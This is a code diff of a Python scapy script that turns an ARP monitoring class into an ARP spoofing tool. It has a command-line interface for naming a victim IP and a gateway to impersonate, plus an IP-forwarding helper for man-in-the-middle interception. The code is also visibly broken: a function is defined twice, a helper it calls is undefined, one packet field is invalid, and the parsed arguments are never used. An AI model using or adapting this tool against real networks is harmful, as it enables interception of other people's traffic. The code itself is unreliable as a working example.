@@ -1,45 +1,49 @@
 import sys, scapy, time, os, socket
 from scapy import *
-class ARP:
+from argparse import ArgumentParser
+from os import geteuid
+from uuid import getnode as get_mac
 
-	def enable_forwarding(self):
-		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+def enable_forwarding():
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-	#count is how many packets to count
-	#filename is assumed to be valid
-	#returns 1 when done
-	def arp_monitor(self, filename, count):
-		pkts =sniff(filter="arp", count=count)
-		wrpcap(filename,pkts)
-		return 1;
+#count is how many packets to count
+#filename is assumed to be valid
+#returns 1 when done
 
-    #doesn't store anythng
-	def arp_monitor(self):
-		sniff(prn=arp_monitor_callback,filter="arp",store=0)
+def arp_spoof(victimIp,victimMac, srcIp):
+	pkt = ARP()
+	pkt.op= 'is at'
+	pkt.pdst = victimIp
+	pkt.hwdst = victimMac
+	pkt.src = srcIp
+	sendp(pkt,loop = 1)
+def arp_spoof(victimIp, victimMac, iface):
+	pkt = ARP()
+	pkt.op= 2
+	pkt.pdst=victimIp
+	pkt.hwdst=victimMac
+	pkt.src= socket.gethostbyname(socket.gethostname())
+	pkt.hwsrc = get_host_mac()
+	sendp(pkt,iface=iface, loop = 1)
 
-	def arp_monitor_callback(self, pkt):
-		if ARP in pkt and pkt[ARP].op in(1,2):
-			return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
+def getmac(interface):
+  try:
+    mac = open('/sys/class/net/'+interface+'/address').readline()
+  except:
+    mac = "00:00:00:00:00:00"
 
-	def arp_spoof(self,victimIp,victimMac, srcIp, srcMac,iface):
-		pkt = Ether()/ARP()
-		pkt.pdst = victimIp
-		pkt.hwdst = victimMac
-		pkt.src = srcIp
-		pkt.srcMac = srcMac
-		sendp(pkt,iface=iface, loop = 1)
-	def arp_spoof(self, victimIp, victimMac, iface):
-		pkt = Ether()/ARP()
-		pkt.pdst=victimIp
-		pkt.hwdst=victimMac
-		pkt.src= socket.gethostbyname(socket.gethostname())
-		pkt.hwsrc = get_host_mac()
-		sendp(pkt,iface=iface, loop = 1)
-	def get_host_mac(self):
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', nicname[:15]))
-	    return ':'.join(['%02x' % ord(char) for char in info[18:24]])
-
+  return mac[0:17]
 #calls function arp_monitor_callback
-	def __init__ (self):
-		enable_forwarding(self)
+if __name__ == "__main__":
+	if not geteuid() == 0:
+		exit("[-] Rerun with root access")
+	#enable_forwarding()
+	parser = ArgumentParser(description = '[-] BELIEVE YOU ARE THE GATEWAY')
+	parser.add_argument('-i', required=True, help= 'Set interface')
+	parser.add_argument('-t', '--targetIp', required=True, help= 'Set Victim Ip Address')
+	parser.add_argument('-g', '--gatewayIp',required=True,help= 'Set ip you want to impersonate')
+	args = parser.parse_args()
+
+
+
